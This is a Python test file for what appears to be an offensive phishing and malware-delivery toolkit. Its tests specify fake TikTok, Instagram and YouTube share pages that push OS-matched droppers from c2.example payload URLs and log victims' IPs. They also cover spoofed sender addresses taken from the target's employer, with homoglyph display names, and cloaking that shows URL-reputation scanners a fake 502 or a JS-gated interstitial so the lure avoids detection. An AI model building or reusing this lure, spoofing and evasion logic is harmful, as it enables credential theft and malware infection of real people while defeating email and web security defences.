"""Tests for share-format video IP-grabber links (the URL shape you get when
you share a reel/short) and realistic sender-domain derivation."""
import http.client
import unittest

from phantom.automation.social.grabbit import IpGrabber
from phantom.automation.social.engine import SocialEngine
from phantom.automation.social.mailers import Mailer
from phantom.automation.social.tracker import TrackingServer


class TestDeliveryOsDetection(unittest.TestCase):
    """The delivery layer must serve the OS-correct binary: the operator
    should not have to know the target platform when building the lure."""

    _ANDROID = ("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/125 Mobile Safari/537.36")
    _WINDOWS = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/125 Safari/537.36")
    _IPHONE = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
               "AppleWebKit/605.1.15")
    _LINUX = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125"

    def test_platform_from_ua(self):
        from phantom.automation.social.tracker import platform_from_ua
        self.assertEqual(platform_from_ua(self._ANDROID), "android")
        self.assertEqual(platform_from_ua(self._IPHONE), "ios")
        self.assertEqual(platform_from_ua(self._WINDOWS), "windows")
        self.assertEqual(platform_from_ua(self._LINUX), "linux")
        self.assertEqual(platform_from_ua(""), "linux")

    def _urls(self):
        return {
            "windows": "https://c2.example/api/v1/payload",
            "linux": "https://c2.example/api/v1/payload_linux",
            "macos": "https://c2.example/api/v1/payload_macos",
            "android": "https://c2.example/api/v1/payload_android",
        }

    def test_redirect_picks_binary_by_user_agent(self):
        server = TrackingServer(host="127.0.0.1", port=0, skin="instagram")
        server.register_redirect("auto1", self._urls())
        server.start()
        try:
            port = server._httpd.server_address[1]
            for ua, expect in ((self._ANDROID, "payload_android"),
                               (self._WINDOWS, "payload?"),
                               (self._LINUX, "payload_linux")):
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
                conn.request("GET", "/reel/auto1", headers={"User-Agent": ua})
                resp = conn.getresponse()
                loc = resp.getheader("Location", "")
                conn.close()
                self.assertEqual(resp.status, 302)
                if expect.endswith("?"):
                    self.assertTrue(loc.endswith("/payload"), loc)
                else:
                    self.assertIn(expect, loc)
        finally:
            server.stop()

    def test_player_page_saves_a_runnable_name(self):
        """The saved file must keep a runnable extension for the visitor's
        OS: a PE saved as .mp4 does not execute, an APK saved as .mp4 does
        not install — the fake extension is what kills the delivery."""
        from phantom.automation.social.tracker import download_name_for
        self.assertEqual(download_name_for("c1", "windows"),
                         "VideoPlayer-c1.exe")
        self.assertEqual(download_name_for("c1", "android"),
                         "VideoPlayer-c1.apk")
        self.assertEqual(download_name_for("c1", "linux"),
                         "video-player-linux-c1")
        self.assertEqual(download_name_for("c1", "windows", "Report.doc.exe"),
                         "Report.doc.exe")
        server = TrackingServer(host="127.0.0.1", port=0, skin="instagram")
        server.register_player("dn1", payload_urls=self._urls())
        server.start()
        try:
            port = server._httpd.server_address[1]
            for ua, expect in ((self._ANDROID, "VideoPlayer-dn1.apk"),
                               (self._WINDOWS, "VideoPlayer-dn1.exe")):
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
                conn.request("GET", "/reel/dn1", headers={"User-Agent": ua})
                body = conn.getresponse().read().decode("utf-8", "ignore")
                conn.close()
                self.assertIn(expect, body, ua)
                self.assertNotIn(".mp4", body, ua)
        finally:
            server.stop()

    def test_player_page_embeds_os_matched_payload(self):
        server = TrackingServer(host="127.0.0.1", port=0, skin="instagram")
        server.register_player("auto2", payload_urls=self._urls())
        server.start()
        try:
            port = server._httpd.server_address[1]
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
            conn.request("GET", "/reel/auto2", headers={"User-Agent": self._ANDROID})
            body = conn.getresponse().read().decode("utf-8", "ignore")
            conn.close()
            self.assertIn("payload_android", body)
        finally:
            server.stop()


class TestShareFormatRoutes(unittest.TestCase):

    def _server(self):
        return TrackingServer(host="127.0.0.1", port=0, skin="tiktok",
                              video_id="dQw4w9WgXcQ")

    def test_tiktok_share_path(self):
        server = self._server()
        server.start()
        try:
            port = server._httpd.server_address[1]
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
            # the real TikTok share URL shape: /@user/video/123
            conn.request("GET", "/@mario.rossi/video/abc1")
            resp = conn.getresponse()
            self.assertEqual(resp.status, 200)
            body = resp.read().decode("utf-8", "ignore")
            conn.close()
            self.assertIn("TikTok", body)
            self.assertEqual(len(server.store.hits("abc1")), 1)
        finally:
            server.stop()

    def test_instagram_reel_share_path(self):
        server = TrackingServer(host="127.0.0.1", port=0, skin="instagram")
        server.start()
        try:
            port = server._httpd.server_address[1]
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
            conn.request("GET", "/reel/abc2")
            resp = conn.getresponse()
            body = resp.read().decode("utf-8", "ignore")
            conn.close()
            self.assertEqual(resp.status, 200)
            self.assertIn("Instagram", body)
            self.assertEqual(len(server.store.hits("abc2")), 1)
        finally:
            server.stop()

    def test_registered_video_renders_real_title_channel(self):
        server = self._server()
        server.start()
        try:
            server.register_video("abc9", {"id": "dQw4w9WgXcQ",
                                           "title": "Never Gonna Give You Up",
                                           "channel": "RickAstleyVEVO"})
            port = server._httpd.server_address[1]
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
            conn.request("GET", "/@creator/video/abc9")
            resp = conn.getresponse()
            body = resp.read().decode("utf-8", "ignore")
            conn.close()
            self.assertEqual(resp.status, 200)
            # the lure plays and names the REAL video, not a placeholder
            self.assertIn("dQw4w9WgXcQ", body)
            self.assertIn("Never Gonna Give You Up", body)
            self.assertIn("RickAstleyVEVO", body)
            self.assertEqual(len(server.store.hits("abc9")), 1)
        finally:
            server.stop()

    def test_youtube_shorts_share_path(self):
        server = TrackingServer(host="127.0.0.1", port=0, skin="youtube")
        server.start()
        try:
            port = server._httpd.server_address[1]
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
            conn.request("GET", "/shorts/abc3")
            resp = conn.getresponse()
            self.assertEqual(resp.status, 200)
            conn.close()
            self.assertEqual(len(server.store.hits("abc3")), 1)
        finally:
            server.stop()


class TestShareLinkFactory(unittest.TestCase):

    def test_tiktok_share_prefix_with_handle(self):
        from phantom.automation.social.tracker import TrackingServer
        g = IpGrabber(server=TrackingServer(host="127.0.0.1", port=0))
        link = g.create_video_share_link(label="vid", platform="tiktok",
                                         handle="mario.rossi")
        self.assertIn("/@mario.rossi/video/", link.short_url, link)
        g._default_server.stop()

    def test_instagram_share_prefix(self):
        g = IpGrabber(creator=lambda code: f"http://t/{code}",
                      fetcher=lambda code: [])
        # injected creator ignores the prefix — assert the code is intact
        link = g.create_video_share_link(label="vid", platform="instagram")
        self.assertIn("vid-", link.code)

    def test_youtube_share_prefix(self):
        from phantom.automation.social.tracker import TrackingServer
        g = IpGrabber(server=TrackingServer(host="127.0.0.1", port=0))
        link = g.create_video_share_link(label="vid", platform="youtube")
        self.assertIn("/shorts/", link.short_url, link)
        g._default_server.stop()

    def test_no_traceable_profile_identifier(self):
        # the share URL carries the tracking code, never a real account id
        g = IpGrabber(creator=lambda code: f"http://t/{code}",
                      fetcher=lambda code: [])
        link = g.create_video_share_link(label="vid", platform="tiktok",
                                         handle="real-victim-handle")
        self.assertNotIn("real-victim-handle", link.short_url)


class _FakeMail:
    def __init__(self):
        self.sent = []

    def send_email(self, from_, to, subject, body, html="", reply_to=None):
        self.sent.append((from_, to, subject, body, html))
        return True

    def send_sms(self, *a, **k):
        return True


class TestSenderDerivation(unittest.TestCase):

    def _engine(self, email, platform=""):
        eng = SocialEngine()
        fake = _FakeMail()
        eng._mailer = fake
        eng._grabber = type("G", (), {
            "create_link": lambda s, label="p", prefix="": type(
                "L", (), {"short_url": f"http://t/{prefix}c", "code": "c"})(),
            "create_login_link": lambda s, label="p": type(
                "L", (), {"short_url": "http://t/l/c", "code": "c"})(),
            "create_video_link": lambda s, label="p": type(
                "L", (), {"short_url": "http://t/v/c", "code": "c"})(),
            "poll_opens": lambda *a, **k: [],
            "poll_hits": lambda *a, **k: [],
            "poll_creds": lambda *a, **k: [],
        })()
        eng._persona_inst = type("P", (), {"email": "persona@grr.la"})()
        eng._discovered.update({"emails": [email], "platform": platform})
        return eng, fake

    # Cyrillic homoglyphs look identical to humans; normalize them back to
    # Latin so display-name assertions read cleanly.
    _CYR_TO_LAT = [("\u0430", "a"), ("\u0435", "e"), ("\u043e", "o"),
                   ("\u0440", "p"), ("\u0441", "c"), ("\u0443", "y"),
                   ("\u0445", "x"), ("\u043a", "k"), ("\u043c", "m"),
                   ("\u0442", "t"), ("\u04bb", "h"), ("\u0432", "b"),
                   ("\u043f", "n"),
                   ("\u0410", "A"), ("\u0415", "E"), ("\u041e", "O"),
                   ("\u0420", "P"), ("\u0421", "C"), ("\u0423", "Y"),
                   ("\u0425", "X"), ("\u041a", "K"), ("\u041c", "M"),
                   ("\u0422", "T"), ("\u04ba", "H"), ("\u0412", "B"),
                   ("\u041f", "N")]

    def _norm(self, text):
        for cyr, lat in self._CYR_TO_LAT:
            text = text.replace(cyr, lat)
        return text

    def test_corporate_domain_sender(self):
        eng, fake = self._engine("mario.rossi@acme.it")
        ok, _ = eng.phish("mario.rossi@acme.it", "email")
        self.assertTrue(ok)
        from_hdr = fake.sent[0][0]
        # the sender is derived from the target's company, not a fake
        # .example domain; the display name is homoglyph-obfuscated
        self.assertIn("no-reply@acme.it", from_hdr)
        self.assertIn("Acme <", self._norm(from_hdr))

    def test_platform_domain_for_free_mail(self):
        eng, fake = self._engine("mario.rossi@gmail.com", platform="linkedin")
        ok, _ = eng.phish("mario.rossi@gmail.com", "email")
        self.assertTrue(ok)
        # a service the target uses (LinkedIn), not the free-mail provider
        self.assertIn("noreply@linkedin.com", fake.sent[0][0])
        self.assertIn("LinkedIn <", self._norm(fake.sent[0][0]))

    def test_fallback_uses_attacker_mailbox_when_unknown(self):
        eng, fake = self._engine("mario.rossi@gmail.com")
        ok, _ = eng.phish("mario.rossi@gmail.com", "email")
        self.assertTrue(ok)
        # free-mail target with no platform known: the display name carries
        # the realism, the address is the attacker's disposable mailbox
        self.assertIn("persona@grr.la", fake.sent[0][0])
        self.assertIn("IT Security Team <", self._norm(fake.sent[0][0]))

    def test_homoglyph_off_in_aggressive(self):
        eng, fake = self._engine("mario.rossi@acme.it")
        eng.set_social_config(aggressive=True)
        ok, _ = eng.phish("mario.rossi@acme.it", "email")
        self.assertTrue(ok)
        from_hdr = fake.sent[0][0]
        # aggressive mode drops the stealth homoglyphs (clean display)
        self.assertEqual(from_hdr, self._norm(from_hdr))



class TestPreviewCrawlerGuard(unittest.TestCase):
    """A link pasted into WhatsApp/IG/Telegram is fetched by the PLATFORM to
    build the preview card — that request is not the victim. It must get the
    card only: no payload served, no code burned, no false hit recorded."""

    _BOT = ("Mozilla/5.0 (compatible; facebookexternalhit/1.1; "
            "+http://www.facebook.com/externalhit_uatext.php)")
    _HUMAN = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/125 Safari/537.36")

    def _urls(self):
        return {"windows": "https://c2.example/api/v1/payload",
                "linux": "https://c2.example/api/v1/payload_linux"}

    def _get(self, server, path, ua, extra=None):
        port = server._httpd.server_address[1]
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        headers = {"User-Agent": ua}
        headers.update(extra or {})
        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "ignore")
        status, loc = resp.status, resp.getheader("Location", "")
        conn.close()
        return status, loc, body

    def test_is_preview_bot_detection(self):
        from phantom.automation.social.tracker import is_preview_bot
        for ua in (self._BOT,
                   "WhatsApp/2.24 A",
                   "TelegramBot (like TwitterBot)",
                   "Mozilla/5.0 (compatible; Discordbot/2.0)",
                   "Mozilla/5.0 AppleWebKit/605.1.15 (KHTML, like Gecko) "
                   "Applebot/0.1"):
            self.assertTrue(is_preview_bot(ua), ua)
        self.assertFalse(is_preview_bot(self._HUMAN))
        self.assertFalse(is_preview_bot(""))

    def test_crawler_gets_card_not_payload_and_records_nothing(self):
        server = TrackingServer(host="127.0.0.1", port=0, skin="instagram")
        server.register_player("auto9", payload_urls=self._urls())
        server.start()
        try:
            status, _, body = self._get(server, "/reel/auto9", self._BOT)
            self.assertEqual(status, 200)
            # the preview card renders (OG tags intact)...
            self.assertIn("og:title", body)
            self.assertIn("og:image", body)
            # ...but the crawler is never handed the implant
            self.assertNotIn("payload", body)
            self.assertEqual(server.store.hits("auto9"), [])
            # the human then gets the real dropper and IS recorded
            _, _, human_body = self._get(server, "/reel/auto9", self._HUMAN)
            self.assertIn("payload", human_body)
            self.assertEqual(len(server.store.hits("auto9")), 1)
        finally:
            server.stop()

    def test_crawler_never_follows_beacon_redirect(self):
        server = TrackingServer(host="127.0.0.1", port=0, skin="tiktok")
        server.register_redirect("auto10", self._urls())
        server.start()
        try:
            status, loc, body = self._get(server, "/reel/auto10", self._BOT)
            self.assertEqual(status, 200)
            self.assertEqual(loc, "")
            self.assertIn("og:title", body)
            self.assertEqual(server.store.hits("auto10"), [])
        finally:
            server.stop()

    def test_crawler_on_pixel_is_a_proxied_open_not_a_real_one(self):
        server = TrackingServer(host="127.0.0.1", port=0)
        server.start()
        try:
            self._get(server, "/px/px1", self._BOT)
            self.assertEqual(len(server.store.opens("px1")), 1)
            self.assertTrue(server.store.opens("px1")[0].proxied)
            self._get(server, "/px/px1", self._HUMAN)
            self.assertEqual(len(server.store.opens("px1")), 2)
            self.assertFalse(server.store.opens("px1")[1].proxied)
        finally:
            server.stop()

    def test_image_lure_zero_click_direct_load_is_a_hit(self):
        """The image lure is the real zero-click: rendering the image fires
        it. A direct load by the victim's client is a genuine hit."""
        server = TrackingServer(host="127.0.0.1", port=0)
        server.register_image("img1", b"\xff\xd8\xff\xe0jpegbytes")
        server.start()
        try:
            status, _, _ = self._get(server, "/i/img1", self._HUMAN)
            self.assertEqual(status, 200)
            self.assertEqual(len(server.store.hits("img1")), 1)
            self.assertEqual(server.store.opens("img1"), [])
        finally:
            server.stop()

    def test_is_scanner_detection(self):
        from phantom.automation.social.tracker import is_scanner
        for ua in ("Mozilla/5.0 (compatible; urlscan.io)",
                   "Mozilla/5.0 Proofpoint URL Defense",
                   "Mimecast Secure Email",
                   "Microsoft Office 365 Message Scanning",
                   "Mozilla/5.0 (compatible; Google Safe Browsing)",
                   "Zscaler"):
            self.assertTrue(is_scanner(ua), ua)
        self.assertFalse(is_scanner(self._HUMAN))
        self.assertFalse(is_scanner(""))

    def test_scanner_gets_a_decoy_and_is_logged(self):
        """A URL-reputation scanner must not be served the lure (that is how
        the URL gets flagged for every recipient) — and its visit is intel:
        the engagement is being inspected."""
        server = TrackingServer(host="127.0.0.1", port=0, skin="instagram")
        server.register_player("sc1", payload_urls=self._urls())
        server.start()
        try:
            status, loc, body = self._get(server, "/reel/sc1",
                                          "Mozilla/5.0 Proofpoint URL Defense")
            # a boring infrastructure error: nothing for the scanner to score
            # and nothing that looks like a half-broken lure
            self.assertEqual(status, 502)
            self.assertEqual(loc, "")
            self.assertIn("502 Bad Gateway", body)
            self.assertNotIn("payload", body)
            self.assertNotIn("og:title", body)
            self.assertEqual(server.store.hits("sc1"), [])
            opens = server.store.opens("sc1")
            self.assertEqual(len(opens), 1)
            self.assertTrue(opens[0].scanner)
            # the real visitor still gets the dropper
            _, _, human = self._get(server, "/reel/sc1", self._HUMAN)
            self.assertIn("payload", human)
        finally:
            server.stop()

    def test_failed_delivery_shows_the_platform_error_not_a_broken_clone(self):
        """When the play click finds nothing to deliver, the page must look
        like a REMOVED post (the platform's own error copy), not like a
        half-working replica — that is what keeps the lure alive."""
        server = TrackingServer(host="127.0.0.1", port=0, skin="instagram")
        server.register_player("dead1", payload_urls=self._urls())
        server.start()
        try:
            _, _, body = self._get(server, "/reel/dead1", self._HUMAN)
            self.assertIn("Sorry, this page isn't available", body)
            self.assertIn("dead()", body)
            self.assertNotIn("Content is loading", body)
            # the error block starts hidden so a live delivery never shows it
            self.assertIn('id="err" style="display:none', body)
        finally:
            server.stop()

    def test_each_skin_has_its_own_error_copy(self):
        for skin, expect in (("instagram", "Sorry, this page isn't available"),
                            ("tiktok", "Couldn't find this video"),
                            ("youtube", "This video isn't available anymore")):
            server = TrackingServer(host="127.0.0.1", port=0, skin=skin)
            server.register_player("e1", payload_urls=self._urls())
            server.start()
            try:
                _, _, body = self._get(server, "/reel/e1", self._HUMAN)
                self.assertIn(expect, body, skin)
            finally:
                server.stop()

    def test_scanner_still_receives_image_assets(self):
        """A gateway probing an image lure must get the image (a broken
        image is a spam signal) — it just is not counted as the victim."""
        server = TrackingServer(host="127.0.0.1", port=0)
        server.register_image("scimg", b"\xff\xd8\xff\xe0jpeg")
        server.start()
        try:
            status, _, body = self._get(server, "/i/scimg",
                                        "Mozilla/5.0 Proofpoint URL Defense")
            self.assertEqual(status, 200)
            self.assertTrue(body)
            self.assertEqual(server.store.hits("scimg"), [])
            self.assertEqual(len(server.store.opens("scimg")), 1)
            self.assertTrue(server.store.opens("scimg")[0].proxied)
        finally:
            server.stop()

    def test_js_challenge_gate_serves_nothing_on_the_first_pass(self):
        """Two-stage gate: a URL scanner (no JS) never sees the lure, the
        payload URL or the credential form — only a bland interstitial."""
        server = TrackingServer(host="127.0.0.1", port=0, skin="instagram",
                                js_challenge=True)
        server.register_player("js1", payload_urls=self._urls())
        server.register_redirect("js2", self._urls())
        server.register_image("js3", b"\xff\xd8\xff\xe0jpeg")
        server.start()
        try:
            # first pass on the dropper page: interstitial, no payload, no hit
            status, loc, body = self._get(server, "/reel/js1", self._HUMAN)
            self.assertEqual(status, 200)
            self.assertEqual(loc, "")
            self.assertIn("Loading", body)
            self.assertNotIn("payload", body)
            self.assertNotIn("og:title", body)
            self.assertEqual(server.store.hits("js1"), [])

            # the payload redirect must NOT 302 on the first pass either
            status, loc, body = self._get(server, "/reel/js2", self._HUMAN)
            self.assertEqual(status, 200)
            self.assertEqual(loc, "")
            self.assertNotIn("payload", body)

            # the credential form is behind the same gate
            status, _, body = self._get(server, "/l/js1", self._HUMAN)
            self.assertNotIn("<form", body.lower())

            # images are NOT gated: a mail client cannot run the challenge
            status, _, body = self._get(server, "/i/js3", self._HUMAN)
            self.assertEqual(status, 200)
            self.assertTrue(body)
            self.assertEqual(len(server.store.hits("js3")), 1)

            # second pass carrying the gate cookie: the real page + the hit
            from phantom.automation.social.tracker import _challenge_token
            tok = _challenge_token("js1", server._challenge_salt)
            status, _, body = self._get(server, "/reel/js1", self._HUMAN,
                                        {"Cookie": f"__p={tok}"})
            self.assertIn("payload", body)
            self.assertEqual(len(server.store.hits("js1")), 1)
        finally:
            server.stop()

    def test_js_challenge_off_by_default(self):
        server = TrackingServer(host="127.0.0.1", port=0, skin="instagram")
        server.register_player("js4", payload_urls=self._urls())
        server.start()
        try:
            _, _, body = self._get(server, "/reel/js4", self._HUMAN)
            self.assertIn("payload", body)
            self.assertEqual(len(server.store.hits("js4")), 1)
        finally:
            server.stop()

    def test_gmail_image_proxy_is_not_the_victim(self):
        """Gmail fetches every remote image from its own edge, so the source
        IP is Google's. That must never be recorded as the target's IP."""
        google = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "GoogleImageProxy/1.0")
        from phantom.automation.social.tracker import is_image_proxy
        self.assertTrue(is_image_proxy(google))
        self.assertTrue(is_image_proxy("Mozilla/5.0 YahooMailProxy"))
        self.assertTrue(is_image_proxy("Proofpoint URL Defense"))
        self.assertFalse(is_image_proxy(self._HUMAN))
        server = TrackingServer(host="127.0.0.1", port=0)
        server.register_image("img2", b"\xff\xd8\xff\xe0jpegbytes")
        server.start()
        try:
            status, _, body = self._get(server, "/i/img2", google)
            self.assertEqual(status, 200)
            # the image still renders (a broken image = spam signal)...
            self.assertTrue(body)
            # ...but the "victim" list stays empty and the open is flagged
            self.assertEqual(server.store.hits("img2"), [])
            self.assertEqual(len(server.store.opens("img2")), 1)
            self.assertTrue(server.store.opens("img2")[0].proxied)
        finally:
            server.stop()


if __name__ == "__main__":
    unittest.main()
